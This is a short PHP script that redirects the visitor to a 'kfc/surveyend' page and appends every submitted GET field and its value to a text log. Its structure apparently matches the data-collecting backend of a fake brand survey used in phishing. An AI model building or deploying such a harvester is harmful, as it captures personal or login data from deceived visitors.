<?php
header("Location:http://localhost/htdocs/kfc/surveyend");
$handle = fopen("logs.txt", "a");
foreach($_GET as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, " = ");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "===============================\r\n");
fclose($handle);
exit;
?>